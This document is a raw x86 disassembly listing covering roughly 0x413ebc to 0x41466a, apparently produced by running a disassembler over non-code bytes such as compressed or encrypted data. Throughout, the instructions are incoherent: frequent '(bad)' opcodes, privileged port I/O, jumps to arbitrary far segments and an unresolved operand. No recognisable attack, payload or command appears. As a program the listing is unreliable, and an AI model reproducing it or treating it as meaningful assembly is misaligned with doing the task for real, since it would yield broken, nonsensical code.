  413ebc:	sar    BYTE PTR [esi+edi*1+0xb],cl
  413ec0:	xor    DWORD PTR [edi-0x7aaaeba1],esp
  413ec6:	xchg   DWORD PTR [edi],ecx
  413ec8:	test   al,0x9c
  413eca:	xchg   DWORD PTR [eax],edx
  413ecc:	out    dx,eax
  413ecd:	sub    DWORD PTR [edx-0x6c],esi
  413ed0:	aad    0xaa
  413ed2:	sbb    esi,eax
  413ed4:	push   ebx
  413ed5:	xchg   ebx,eax
  413ed6:	out    0xc,eax
  413ed8:	sbb    ah,0x38
  413edb:	daa    
  413edc:	or     esi,edx
  413ede:	stc    
  413edf:	dec    edx
  413ee0:	xor    eax,0x14be545e
  413ee5:	lahf   
  413ee6:	lods   eax,DWORD PTR ds:[esi]
  413ee7:	stos   BYTE PTR es:[edi],al
  413ee8:	mov    dh,0x4c
  413eea:	ins    BYTE PTR es:[edi],dx
  413eeb:	outs   dx,DWORD PTR ds:[esi]
  413eec:	fwait
  413eed:	cmp    eax,0xd2c82fa3
  413ef2:	xchg   bl,bh
  413ef4:	lods   al,BYTE PTR ds:[esi]
  413ef5:	cmp    eax,0x1cb7fafa
  413efa:	or     al,0xad
  413efc:	jl     0x413ecc
  413efe:	rcr    DWORD PTR [edi-0x77],1
  413f01:	jb     0x413f4c
  413f03:	jmp    0x92a9:0x24b475ad
  413f0a:	rol    DWORD PTR ds:0xf451263b,0x6f
  413f11:	nop
  413f12:	mov    WORD PTR [edi+0x55],fs
  413f15:	add    al,0x4c
  413f17:	pop    eax
  413f18:	pushf  
  413f19:	mov    cl,0xcf
  413f1b:	cmp    ch,dl
  413f1d:	imul   edx,DWORD PTR [esp+esi*1-0x5],0x9f931456
  413f25:	cld    
  413f26:	jl     0x413ed1
  413f28:	and    al,0x15
  413f2a:	mov    ds:0xd68840e8,eax
  413f2f:	mov    DWORD PTR [edx+ecx*2-0x172c0327],esp
  413f36:	dec    ebx
  413f37:	mov    eax,ds:0x65eceaf3
  413f3c:	ror    ch,cl
  413f3e:	adc    ebp,esi
  413f40:	in     eax,dx
  413f41:	and    cl,ah
  413f43:	outs   dx,BYTE PTR ds:[esi]
  413f44:	in     eax,0x6f
  413f46:	cs inc esp
  413f48:	pop    ebx
  413f49:	loop   0x413f6f
  413f4b:	lods   al,BYTE PTR ds:[esi]
  413f4c:	les    esp,FWORD PTR [edx]
  413f4e:	cdq    
  413f4f:	mov    bl,0xe5
  413f51:	and    bl,BYTE PTR [eax]
  413f53:	(bad)  
  413f54:	lock and bh,BYTE PTR [ecx+0x7]
  413f58:	sahf   
  413f59:	inc    ebp
  413f5a:	xchg   ecx,eax
  413f5b:	mov    cl,BYTE PTR [esi+0x55]
  413f5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f5f:	(bad)  
  413f60:	mov    cl,0xb0
  413f62:	out    0xb4,eax
  413f64:	adc    bl,dl
  413f66:	adc    al,0x74
  413f68:	jmp    0x413fe5
  413f6a:	fmul   DWORD PTR [ebx+0x45]
  413f6d:	fs dec esi
  413f6f:	xlat   BYTE PTR ds:[ebx]
  413f70:	add    DWORD PTR [edx+0x75],0x5e7f6178
  413f77:	sub    edx,edx
  413f79:	mov    bh,0x84
  413f7b:	or     eax,0x282acb56
  413f80:	jge    0x413fd5
  413f82:	je     0x413fdc
  413f84:	adc    BYTE PTR [ebp+esi*2+0x56],al
  413f88:	jns    0x413f5b
  413f8a:	xlat   BYTE PTR ds:[ebx]
  413f8b:	mov    ebx,0x50e9853d
  413f90:	sbb    al,BYTE PTR [eax-0x75b4dc95]
  413f96:	scas   eax,DWORD PTR es:[edi]
  413f97:	cmp    al,0xc6
  413f99:	shl    DWORD PTR [ecx-0xc],cl
  413f9c:	test   DWORD PTR [edi],0xb94d69e6
  413fa2:	mov    bl,BYTE PTR [esi+0x67]
  413fa5:	cwde   
  413fa6:	lea    ebx,[esp+eiz*2-0x10]
  413faa:	mov    dh,0x2d
  413fac:	cmp    esi,0x69
  413faf:	jmp    0xbb37d1cc
  413fb4:	inc    edx
  413fb5:	mov    edi,0xa11295b9
  413fba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fbb:	scas   eax,DWORD PTR es:[edi]
  413fbc:	jmp    0xb1c8:0x584508b6
  413fc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413fc4:	lods   al,BYTE PTR ds:[esi]
  413fc5:	call   0x4e79:0xe4bbfcdd
  413fcc:	cmc    
  413fcd:	and    dl,BYTE PTR [ecx+0x2b]
  413fd0:	mov    dh,0x6c
  413fd2:	xor    bl,BYTE PTR [ebx+0x31]
  413fd5:	adc    BYTE PTR [edx+0x26],dh
  413fd8:	jle    0x414027
  413fda:	ficomp DWORD PTR [ecx-0x2ada8433]
  413fe0:	lods   al,BYTE PTR ds:[esi]
  413fe1:	add    esi,DWORD PTR [esi-0x5c]
  413fe4:	mov    al,ds:0x4bce020c
  413fe9:	(bad)  
  413fea:	mov    ds:0x79dea73e,al
  413fef:	das    
  413ff0:	mov    ebx,0x3f34c992
  413ff5:	sahf   
  413ff6:	push   cs
  413ff7:	mov    esp,0xdc9fb5c3
  413ffc:	mov    cl,0x47
  413ffe:	nop
  413fff:	push   ebp
  414000:	or     al,0x96
  414002:	bound  esp,QWORD PTR [edi+0x22d985aa]
  414008:	push   ebx
  414009:	(bad)  
  41400a:	(bad)  [eax]
  41400c:	popf   
  41400d:	rcr    bh,cl
  41400f:	jne    0x414015
  414011:	xor    al,0x88
  414013:	rcl    edx,cl
  414015:	push   es
  414016:	leave  
  414017:	inc    edx
  414018:	or     DWORD PTR [ebp-0x6a648096],edx
  41401e:	cmp    DWORD PTR [ecx+ecx*1-0xe],esi
  414022:	sub    BYTE PTR [si+0x73],bl
  414026:	cmp    dl,bl
  414028:	jmp    0xeae95caf
  41402d:	inc    esi
  41402e:	je     0x414056
  414030:	and    eax,0xb7f26ecb
  414035:	adc    eax,ebx
  414037:	xchg   esi,eax
  414038:	or     eax,DWORD PTR ds:0x22a5bed2
  41403e:	mov    ch,BYTE PTR cs:[ecx-0x1a]
  414042:	mov    BYTE PTR [ebx+0x23],ch
  414045:	adc    cl,BYTE PTR [ebp-0x20]
  414048:	or     al,0x87
  41404a:	fbstp  TBYTE PTR [esi+0x51]
  41404d:	push   0x8edb708b
  414052:	test   eax,0x58e5b3e6
  414057:	adc    eax,0x3e52bb1b
  41405c:	xor    ch,BYTE PTR [edi-0x422b7398]
  414062:	and    DWORD PTR [edx],ebx
  414064:	sti    
  414065:	mov    esi,0x63f9a1b0
  41406a:	hlt    
  41406b:	cld    
  41406c:	pop    ecx
  41406d:	and    al,0x98
  41406f:	jmp    0x89a75034
  414074:	popf   
  414075:	cs loopne 0x414045
  414078:	cmp    eax,0x1a6f26d8
  41407d:	cmp    bh,BYTE PTR [ecx]
  41407f:	das    
  414080:	cmp    DWORD PTR [ecx],ebx
  414082:	sub    ah,BYTE PTR [eax]
  414084:	and    al,0xff
  414086:	ret    
  414087:	or     BYTE PTR [edx+ecx*8],cl
  41408a:	add    DWORD PTR [ebx-0x68d11bb3],ebp
  414090:	mov    bh,0x2f
  414092:	lds    edi,FWORD PTR [ecx+0x34]
  414095:	scas   eax,DWORD PTR es:[edi]
  414096:	xchg   bl,bh
  414098:	mov    esi,ebx
  41409a:	cmc    
  41409b:	ror    BYTE PTR [esi+ebp*8-0x80],0x92
  4140a0:	pop    ebx
  4140a1:	jp     0x4140dc
  4140a3:	lods   eax,DWORD PTR ds:[esi]
  4140a4:	mov    ds:0x215016c8,eax
  4140a9:	div    BYTE PTR [edx-0x31e20a62]
  4140af:	fdiv   QWORD PTR [ecx-0x6e]
  4140b2:	popf   
  4140b3:	jns    0x4140c3
  4140b5:	mov    eax,ds:0x87516253
  4140ba:	pop    edx
  4140bb:	pushf  
  4140bc:	add    BYTE PTR [ecx-0x51],0x64
  4140c0:	fiadd  WORD PTR [ecx]
  4140c2:	pop    esi
  4140c3:	stos   BYTE PTR es:[edi],al
  4140c4:	or     edx,ebx
  4140c6:	xchg   BYTE PTR [ecx-0x5b],cl
  4140c9:	jne    0x4140e8
  4140cb:	popa   
  4140cc:	add    DWORD PTR [eax+esi*4],0x5243f2de
  4140d3:	ins    WORD PTR es:[edi],dx
  4140d5:	dec    ebp
  4140d6:	push   es
  4140d7:	out    dx,eax
  4140d8:	test   BYTE PTR [ebx+0x23],bl
  4140db:	mov    al,ds:0x69ce9c4f
  4140e0:	fst    QWORD PTR [edx+0x74]
  4140e3:	outs   dx,DWORD PTR ds:[esi]
  4140e4:	repz int 0xe0
  4140e7:	mov    ebx,0x68567103
  4140ec:	jns    0x4140f1
  4140ee:	dec    esi
  4140ef:	es adc al,0x52
  4140f2:	(bad)  
  4140f4:	push   ss
  4140f5:	addr16 sbb bl,bh
  4140f8:	ret    
  4140f9:	cwde   
  4140fa:	jae    0x414098
  4140fc:	fs and eax,0xb17ea17a
  414102:	test   ah,ah
  414104:	xchg   DWORD PTR [ecx],edx
  414106:	add    BYTE PTR [ecx-0x400f4ac3],0x8d
  41410d:	in     eax,0x17
  41410f:	mov    es,WORD PTR [eax+0x1e2127d4]
  414115:	xor    cl,BYTE PTR [eax]
  414117:	xchg   esi,eax
  414118:	xor    al,0x10
  41411a:	lea    esi,[esi-0x30256591]
  414120:	or     BYTE PTR [esi+esi*8-0x56298285],0xb6
  414128:	mov    ebx,0x2d878bf
  41412d:	mov    ah,0xcd
  41412f:	cmp    DWORD PTR [esi+eax*2],ebp
  414132:	iret   
  414133:	xor    DWORD PTR ds:0xdc22eb3b,esp
  414139:	fs stos DWORD PTR es:[edi],eax
  41413b:	and    dl,BYTE PTR [eax-0x74]
  41413e:	dec    edx
  41413f:	shr    BYTE PTR ds:0xed2310d8,cl
  414145:	rol    BYTE PTR [edx+0x68527021],1
  41414b:	jle    0x414129
  41414d:	xchg   ecx,eax
  41414e:	and    ch,BYTE PTR [ecx+0x4446ca15]
  414154:	(bad)  [ebx-0x13a10a12]
  41415a:	add    ebp,DWORD PTR ds:0x6172b3e4
  414160:	in     eax,dx
  414161:	aam    0xe
  414163:	and    bh,ah
  414165:	fld    DWORD PTR [edi]
  414167:	mov    ah,BYTE PTR [eax+0x27]
  41416a:	fwait
  41416b:	cmp    edi,ebx
  41416d:	add    al,0xfb
  41416f:	(bad)  
  414170:	fwait
  414171:	xor    DWORD PTR [eax-0x2a],esi
  414174:	(bad)  
  414175:	dec    edi
  414176:	out    0x41,al
  414178:	ins    BYTE PTR es:[edi],dx
  414179:	jae    0x4141df
  41417b:	fwait
  41417c:	push   esp
  41417d:	and    dh,dl
  41417f:	je     0x41411f
  414181:	cmp    esi,DWORD PTR [eax+edi*1]
  414184:	pop    eax
  414185:	fucomp st(2)
  414187:	adc    BYTE PTR [esi],dl
  414189:	dec    ecx
  41418a:	fstp   TBYTE PTR ds:0x79b53b0f
  414190:	sbb    edi,ebp
  414192:	shr    BYTE PTR [ebp+0x6f],0x75
  414196:	repz dec ebp
  414198:	mov    eax,DWORD PTR [eax+0x7d]
  41419b:	xchg   ecx,eax
  41419c:	pop    DWORD PTR [ecx+0x47]
  41419f:	mov    ah,0xaf
  4141a1:	or     BYTE PTR [ebx],bl
  4141a3:	(bad)
  4141a7:	xchg   edx,eax
  4141a8:	inc    ebp
  4141a9:	out    0xeb,al
  4141ab:	mov    edi,0x85aed452
  4141b0:	fnstcw WORD PTR [ebp+esi*8-0x4899465d]
  4141b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4141b8:	and    dl,ch
  4141ba:	inc    edi
  4141bb:	fistp  DWORD PTR [ecx]
  4141bd:	aas    
  4141be:	test   BYTE PTR [ebx+ecx*1],bl
  4141c1:	setae  BYTE PTR [eax]
  4141c4:	fcom   QWORD PTR [eax+0x16]
  4141c7:	mov    edi,0x5f040012
  4141cc:	and    bl,dh
  4141ce:	jnp    0x4141e2
  4141d0:	jne    0x414230
  4141d2:	stos   BYTE PTR es:[edi],al
  4141d3:	es inc esp
  4141d5:	add    BYTE PTR [ecx-0x2a],0x93
  4141d9:	aas    
  4141da:	fwait
  4141db:	mov    edx,0x87d60d29
  4141e0:	dec    esi
  4141e1:	mov    gs,ebp
  4141e3:	push   es
  4141e4:	test   DWORD PTR [eax],esi
  4141e6:	mov    dl,0xa5
  4141e8:	mov    bl,0xda
  4141ea:	out    0xe4,al
  4141ec:	into   
  4141ed:	jp     0x414266
  4141ef:	add    ah,BYTE PTR [edx]
  4141f1:	xchg   DWORD PTR [ebp+0x79],esi
  4141f4:	loop   0x414268
  4141f6:	jae    0x41419e
  4141f8:	mov    fs,WORD PTR [ebx+0x1f]
  4141fb:	inc    ebp
  4141fc:	sub    DWORD PTR ds:0x2d0578d8,ebp
  414202:	add    DWORD PTR [edx],ecx
  414204:	pop    DWORD PTR [esi-0x52d4c08a]
  41420a:	jnp    0x4141bc
  41420c:	xor    bl,BYTE PTR [ebx-0x63]
  41420f:	in     eax,dx
  414210:	xor    eax,0x8f3e374c
  414215:	rcl    DWORD PTR [ebx+0x72],0xd5
  414219:	or     BYTE PTR [esi],dl
  41421b:	test   eax,0xca917182
  414220:	adc    al,BYTE PTR [esp+eiz*2+0x76]
  414224:	push   es
  414225:	pushf  
  414226:	jae    0x414244
  414228:	nop
  414229:	xlat   BYTE PTR ds:[ebx]
  41422a:	xor    eax,0x859a9762
  41422f:	leave  
  414230:	cmp    sp,si
  414233:	int3   
  414234:	cwde   
  414235:	add    DWORD PTR [ebx-0x5c35050b],esp
  41423b:	pop    edx
  41423c:	or     BYTE PTR [eax-0x3024096],0xee
  414243:	stos   BYTE PTR es:[edi],al
  414244:	fild   QWORD PTR [edi+ebx*1-0x7]
  414248:	xchg   BYTE PTR [edx],ch
  41424a:	ja     0x414220
  41424c:	(bad)  
  41424d:	lods   al,BYTE PTR ds:[esi]
  41424e:	mov    edx,DWORD PTR [esi+0x0]
  414251:	ins    DWORD PTR es:[edi],dx
  414252:	push   eax
  414253:	popa   
  414254:	xchg   edi,eax
  414255:	fidiv  DWORD PTR [esi+0x1e07f868]
  41425b:	mov    esi,0xd377fda9
  414260:	pushf  
  414261:	xchg   ebx,eax
  414263:	aad    0x64
  414265:	push   eax
  414266:	cmp    DWORD PTR [ebx],esp
  414268:	out    dx,eax
  414269:	fwait
  41426a:	aam    0x13
  41426c:	add    cl,BYTE PTR [edi+0x3c]
  41426f:	icebp  
  414270:	sahf   
  414271:	xchg   bh,cl
  414273:	cmc    
  414274:	push   ecx
  414275:	cmp    eax,0x30b613a4
  41427a:	ror    BYTE PTR [edx],0xe1
  41427d:	cs pop esi
  41427f:	pushf  
  414280:	cmp    eax,0x1cb6470
  414285:	xchg   DWORD PTR [eax-0x2],ecx
  414288:	push   esi
  414289:	xor    BYTE PTR ds:0x8574f149,dl
  41428f:	test   al,0x67
  414291:	lods   eax,DWORD PTR ds:[esi]
  414292:	cmp    ah,BYTE PTR [ebp+0x60ea12b]
  414298:	and    DWORD PTR [edx],eax
  41429a:	cmp    eax,0xad370e71
  41429f:	dec    ah
  4142a1:	fimul  DWORD PTR [eax]
  4142a3:	mov    cl,0xdb
  4142a5:	xchg   DWORD PTR ss:[ebp+0x7c],ebp
  4142a9:	out    0x64,al
  4142ab:	or     BYTE PTR [ecx-0x27],bl
  4142ae:	pop    ebp
  4142af:	mov    ebx,0x3a9b9a2
  4142b4:	mov    ebp,0xbd27c57b
  4142b9:	ins    BYTE PTR es:[edi],dx
  4142ba:	mov    edx,0x6d0e9502
  4142bf:	xor    eax,0x84182b02
  4142c4:	retf   
  4142c5:	mov    cl,0x40
  4142c7:	xchg   esp,eax
  4142c8:	sar    DWORD PTR [edi+esi*1-0x4b9a2873],0xa7
  4142d0:	ins    DWORD PTR es:[edi],dx
  4142d1:	add    BYTE PTR [ebp+0x62],0xa
  4142d5:	mov    DWORD PTR [edx+0x7e],esp
  4142d8:	add    bh,ch
  4142da:	pop    ds
  4142db:	cmovl  esp,DWORD PTR [eax+0x40]
  4142df:	sub    BYTE PTR [ebx-0x188dfd61],bh
  4142e5:	jp     0x4142de
  4142e7:	(bad)  
  4142e8:	cmp    eax,0x35818504
  4142ed:	pop    es
  4142ee:	ss xchg esi,eax
  4142f0:	push   es
  4142f1:	mov    esp,0x9cae671f
  4142f6:	xor    eax,0x9154113e
  4142fb:	rcl    edi,0x2a
  4142fe:	mov    ecx,0x39ec5c8c
  414303:	mov    ah,0x78
  414305:	cmp    BYTE PTR [eax+0x77],al
  414308:	lods   eax,DWORD PTR ds:[esi]
  414309:	sub    ecx,DWORD PTR [edi]
  41430b:	jle    0x4142a7
  41430d:	push   cs
  41430e:	out    dx,eax
  41430f:	outs   dx,DWORD PTR ds:[esi]
  414310:	cmp    cl,bh
  414312:	jge    0x4142d2
  414314:	xor    BYTE PTR [edx+ebx*2],0x3b
  414318:	rcr    BYTE PTR [ebp+0x12],1
  41431b:	out    dx,al
  41431c:	shl    BYTE PTR [ebx-0x74],1
  41431f:	repz imul esp,DWORD PTR [ecx+edi*1],0xfffffff5
  414324:	loope  0x41433f
  414326:	imul   esp,DWORD PTR [edx-0x23],0xffffffff
  41432a:	or     dh,BYTE PTR [ebx+0x698b6cde]
  414330:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414331:	dec    ebp
  414332:	xlat   BYTE PTR ds:[ebx]
  414334:	cmp    ah,BYTE PTR [edx+0x1]
  414337:	cmp    al,BYTE PTR [eax+0x49ee1746]
  41433d:	sbb    dl,al
  41433f:	popf   
  414340:	mov    DWORD PTR [eax-0x7],0xe90b0b
  414347:	outs   dx,DWORD PTR ds:[esi]
  414348:	mov    DWORD PTR [ebp+0x50],edx
  41434b:	psubusw mm1,QWORD PTR [edx-0x4dd4757]
  414352:	stos   DWORD PTR es:[edi],eax
  414353:	stos   BYTE PTR es:[edi],al
  414354:	lea    ecx,[esi-0x5d1933fb]
  41435a:	jne    0x41433d
  41435c:	or     DWORD PTR [eax+edi*4-0x3f],ebx
  414360:	cs ret 
  414362:	jmp    0xad36:0xecb105da
  414369:	push   esi
  41436a:	cwde   
  41436b:	dec    ecx
  41436c:	aad    0xb1
  41436e:	lea    ebx,[ecx+0x2bbfda54]
  414374:	mov    al,ds:0x9e1bccec
  414379:	jge    0x4143f5
  41437b:	add    BYTE PTR [edi+esi*2-0x2e],al
  41437f:	fnstcw WORD PTR [esi-0x2b]
  414382:	adc    BYTE PTR [edx+edx*4],ah
  414385:	scas   eax,DWORD PTR es:[edi]
  414386:	and    eax,0x933b0a39
  41438b:	js     0x414392
  41438d:	(bad)  
  41438e:	loopne 0x414366
  414390:	mov    eax,ds:0xdf9a1b6
  414395:	add    eax,0xab52f8ab
  41439a:	fmul   st,st(6)
  41439c:	ins    BYTE PTR es:[edi],dx
  41439d:	sti    
  41439e:	fcomp  st(0)
  4143a0:	cwde   
  4143a1:	pop    es
  4143a2:	imul   edi,ecx,0x4c
  4143a5:	cmp    esi,eax
  4143a7:	adc    al,0xd6
  4143a9:	cmp    bh,al
  4143ab:	imul   eax,DWORD PTR [eax+0x96f3cbc],0xd2731a05
  4143b5:	in     al,0x69
  4143b7:	push   edi
  4143b8:	bound  edi,QWORD PTR [eax-0x7a]
  4143bb:	cmp    DWORD PTR [edx],0x3d7ffe16
  4143c1:	bswap  ebx
  4143c3:	test   eax,0x1d2fce9e
  4143c8:	xchg   DWORD PTR [edi+esi*2],eax
  4143cb:	stc    
  4143cc:	or     dl,dl
  4143ce:	xchg   ecx,eax
  4143cf:	mov    esp,0xb780b868
  4143d4:	jp     0x4143a1
  4143d6:	xor    DWORD PTR [edi+edx*4],eax
  4143d9:	lock aaa 
  4143db:	adc    DWORD PTR [ebp-0x30],edx
  4143de:	(bad)  
  4143e0:	das    
  4143e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143e2:	je     0x4143ed
  4143e4:	xor    edi,esi
  4143e6:	xchg   edi,eax
  4143e7:	jne    0x414439
  4143e9:	or     eax,edx
  4143eb:	out    dx,ax
  4143ed:	jp     0x4143f9
  4143ef:	push   ebp
  4143f0:	stos   DWORD PTR es:[edi],eax
  4143f1:	ja     0x414428
  4143f3:	xchg   ebp,eax
  4143f4:	fcomp  QWORD PTR [ebx+ebx*8]
  4143f7:	jb     0x4143a8
  4143f9:	mov    bl,0xc
  4143fb:	and    ebx,edi
  4143fd:	cmp    BYTE PTR [esp+ecx*4-0xf],cl
  414401:	mov    dl,0xdd
  414403:	icebp  
  414404:	scas   eax,DWORD PTR es:[edi]
  414405:	les    eax,FWORD PTR [edx+0x4917e13e]
  41440b:	pop    edi
  41440c:	dec    edx
  41440d:	adc    eax,0xf56a3f8a
  414412:	cwde   
  414413:	(bad)  
  414414:	push   ecx
  414415:	scas   al,BYTE PTR es:[edi]
  414416:	imul   edi,ecx,0x5a
  414419:	aaa    
  41441a:	mov    cl,0x5a
  41441c:	pop    ds
  41441d:	inc    ebp
  41441e:	push   esp
  41441f:	fsubr  st,st(0)
  414421:	pushf  
  414422:	mov    bh,0x77
  414424:	(bad)  
  414426:	je     0x4143dc
  414428:	add    al,0x34
  41442a:	scas   al,BYTE PTR es:[edi]
  41442b:	retf   0xf448
  41442e:	mov    edx,fs
  414430:	ins    BYTE PTR es:[edi],dx
  414431:	push   ss
  414432:	mov    al,0x4b
  414434:	outs   dx,BYTE PTR ds:[esi]
  414435:	fist   DWORD PTR [eax-0x65ea72bd]
  41443b:	fist   WORD PTR ds:[ebp+eax*2+0x7]
  414440:	pushf  
  414441:	(bad)  
  414442:	and    eax,0xfbc0c1a2
  414447:	into   
  414448:	xchg   ebx,eax
  414449:	aam    0xbc
  41444b:	out    dx,al
  41444c:	mov    al,ds:0x745a01f5
  414451:	shrd   DWORD PTR [edx-0x53d354a1],ebx,cl
  414458:	out    0x1b,al
  41445a:	mov    BYTE PTR [ebx+0x3a],bh
  41445d:	xor    DWORD PTR [edi+0x67],ecx
  414460:	cmc    
  414461:	in     eax,0x13
  414463:	inc    esp
  414464:	xor    eax,0xd85fab0b
  414469:	(bad)  
  41446a:	stc    
  41446b:	bound  edi,QWORD PTR [esi+0xa4cc648]
  414471:	sub    ebp,DWORD PTR [edi]
  414473:	mov    ebx,0x30ecd6cd
  414478:	xchg   edi,eax
  414479:	jmp    0x4cac:0x55005e11
  414480:	clc    
  414481:	cmp    DWORD PTR [ebx],ecx
  414483:	lods   al,BYTE PTR ds:[esi]
  414484:	lahf   
  414485:	ins    DWORD PTR es:[edi],dx
  414486:	pushf  
  414487:	scas   eax,DWORD PTR es:[edi]
  414488:	add    DWORD PTR [edi],ebp
  41448a:	fadd   st,st(3)
  41448c:	mov    ebx,?
  41448e:	jge    0x414412
  414490:	jmp    0x30b48458
  414495:	psubq  mm1,QWORD PTR [ebp-0x14]
  414499:	mov    ds:0x3c4e6634,eax
  41449e:	dec    edi
  41449f:	dec    DWORD PTR [esi]
  4144a1:	push   DWORD PTR [eax]
  4144a3:	adc    BYTE PTR [ecx-0x1d],ch
  4144a6:	js     0x4144fc
  4144a8:	aas    
  4144a9:	sub    eax,0x43d2789f
  4144ae:	leave  
  4144af:	sub    al,0x7b
  4144b1:	out    0xcf,eax
  4144b3:	shl    DWORD PTR [ebp-0x1f],1
  4144b6:	lods   al,BYTE PTR ds:[esi]
  4144b7:	push   edi
  4144b9:	lock fst QWORD PTR [ebp+eiz*2-0xc346673]
  4144c1:	mov    gs,ebp
  4144c3:	adc    DWORD PTR [edi],eax
  4144c5:	jmp    0x4144a3
  4144c7:	jecxz  0x41447c
  4144c9:	into   
  4144ca:	xor    eax,0xd1f42d22
  4144cf:	and    eax,0xf0f4112b
  4144d4:	stos   BYTE PTR es:[edi],al
  4144d5:	mov    eax,0xb6213b80
  4144da:	inc    esp
  4144db:	mov    esp,edi
  4144dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144de:	mov    esp,0x3b53978
  4144e3:	mov    ecx,0x97ea50e0
  4144e8:	pop    esi
  4144e9:	inc    edi
  4144ea:	jbe    0x4144c7
  4144ec:	add    DWORD PTR [eax+0x5b73b879],edx
  4144f2:	out    0xa7,eax
  4144f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144f5:	dec    esi
  4144f6:	mov    esi,0x7c3ffe0b
  4144fb:	inc    esi
  4144fc:	or     BYTE PTR [edi],ah
  4144fe:	dec    esi
  4144ff:	test   al,ah
  414501:	xchg   esp,eax
  414502:	pushf  
  414503:	add    BYTE PTR [ebx-0x59],cl
  414506:	add    DWORD PTR [edx-0x4198bdc3],edx
  41450c:	xor    al,0x0
  41450e:	(bad)  
  41450f:	jmp    0x4144ad
  414511:	inc    esp
  414512:	neg    DWORD PTR [edx+0x1a8b38f9]
  414518:	loop   0x414528
  41451a:	iret   
  41451b:	cmp    al,0x7e
  41451d:	pop    ds
  41451e:	xchg   edx,eax
  41451f:	add    ebp,DWORD PTR [eax+eax*1]
  414522:	dec    edx
  414523:	pop    edx
  414524:	mov    ss,WORD PTR cs:[eax-0x6d200ee7]
  41452b:	addr16 ret 
  41452d:	fwait
  41452e:	lods   al,BYTE PTR ds:[esi]
  41452f:	or     al,0x3d
  414531:	and    cl,BYTE PTR [ebx-0x6]
  414534:	jmp    0x414511
  414536:	iretw  
  414538:	add    DWORD PTR [esi],ecx
  41453a:	retf   0x8078
  41453d:	jge    0x4144f5
  41453f:	mov    eax,0xd7de6e72
  414544:	sbb    DWORD PTR [ecx+0x6e3e1db8],ecx
  41454a:	mov    ecx,0x5f846086
  41454f:	outs   dx,BYTE PTR ds:[esi]
  414550:	aad    0xfc
  414552:	addr16 push esp
  414554:	adc    al,ch
  414556:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414557:	jmp    DWORD PTR [edi-0x62be5f33]
  41455d:	or     eax,0x449afa2f
  414562:	pop    eax
  414563:	daa    
  414564:	xor    eax,0x8917f39a
  414569:	(bad)
  41456c:	sub    al,0x1
  41456e:	pop    eax
  41456f:	fwait
  414570:	scas   eax,DWORD PTR es:[edi]
  414571:	push   0x3a8b8f8
  414576:	iret   
  414577:	in     eax,dx
  414578:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414579:	sub    BYTE PTR ds:0x3759d68d,ch
  41457f:	pop    ss
  414580:	cmp    bh,BYTE PTR [edx+0x76]
  414583:	ret    0x265f
  414586:	xor    esi,DWORD PTR [ebx+0x63]
  414589:	mov    ds:0x2af425a6,al
  41458e:	pop    esi
  41458f:	jl     0x4145d3
  414591:	xor    al,0xd
  414593:	ss cmp eax,0x40b63ea0
  414599:	shl    DWORD PTR [ebp+0x40a38ea4],1
  41459f:	fbstp  TBYTE PTR [eax]
  4145a1:	(bad)  
  4145a2:	and    al,0xc1
  4145a4:	pop    esi
  4145a5:	(bad)  
  4145a6:	or     al,0x9d
  4145a8:	shl    BYTE PTR [edx],0xcb
  4145ab:	adc    BYTE PTR [eax],0x6c
  4145ae:	es add dl,0x19
  4145b2:	rcl    dh,cl
  4145b4:	sar    BYTE PTR [ecx-0x46],cl
  4145b7:	xchg   edx,eax
  4145b8:	push   edx
  4145b9:	call   0xcdf2:0xe41a2191
  4145c0:	mov    esp,0xd0994ed5
  4145c5:	jo     0x4145f5
  4145c7:	popf   
  4145c8:	cmp    bh,cl
  4145ca:	or     al,0x86
  4145cc:	imul   edx,DWORD PTR [ecx+0x56],0x4b
  4145d0:	ror    DWORD PTR [esi-0x34],0x8b
  4145d4:	and    BYTE PTR [edi+ecx*2+0x58dee313],bl
  4145db:	ds in  eax,0xba
  4145de:	mov    bl,0x70
  4145e0:	mov    ds:0xf3b92763,eax
  4145e5:	not    BYTE PTR ds:[eax+0x20]
  4145e9:	inc    edx
  4145ea:	adc    BYTE PTR ds:[ecx],ah
  4145ed:	dec    ebp
  4145ee:	shl    edx,1
  4145f0:	aaa    
  4145f1:	nop
  4145f2:	inc    ebx
  4145f3:	pop    esp
  4145f4:	fisub  DWORD PTR [edx-0x2]
  4145f7:	pop    esi
  4145f8:	xor    eax,0xe8dede35
  4145fd:	push   ss
  4145fe:	cmp    eax,0x79ed9b42
  414603:	dec    edx
  414604:	sbb    bh,BYTE PTR [ebp-0x14ff6c63]
  41460a:	test   eax,0xf8371e24
  41460f:	mov    al,0xea
  414611:	sub    BYTE PTR [ebx],ah
  414613:	nop
  414614:	pop    ebp
  414615:	adc    eax,0xb405ba42
  41461a:	ja     0x4145ca
  41461c:	iret   
  41461d:	add    al,BYTE PTR [eax+0x18df9b7d]
  414623:	xchg   ecx,eax
  414624:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414625:	dec    edi
  414626:	inc    ebp
  414627:	mov    ch,0x11
  414629:	clc    
  41462a:	xor    al,0xbd
  41462c:	jb     0x4145f3
  41462e:	pop    ss
  41462f:	pop    esp
  414630:	push   edx
  414631:	ss (bad) 
  414633:	cmp    eax,0xfa572a6c
  414638:	lock xor eax,0x3be85174
  41463e:	rcr    ebx,cl
  414640:	(bad)  
  414641:	push   ss
  414642:	cmp    eax,0xa3ef21b
  414647:	outs   dx,DWORD PTR ds:[esi]
  414648:	cs cli 
  41464a:	scas   al,BYTE PTR es:[edi]
  41464b:	or     eax,esi
  41464d:	test   ch,bl
  41464f:	shr    DWORD PTR [ebp-0x171e8c43],1
  414655:	xor    esp,DWORD PTR [edx]
  414657:	(bad)  
  414658:	(bad)  
  414659:	jmp    0x41466f
  41465b:	dec    ecx
  41465c:	push   edi
  41465d:	or     DWORD PTR [ecx+0x6e],0x65
  414661:	pop    es
  414662:	pop    ecx
  414663:	fimul  WORD PTR [ebx+esi*4-0x80]
  414667:	sub    BYTE PTR [edi-0x54],dh
  41466a:	and    ah,BYTE PTR [esi+0x1e5e61ff]
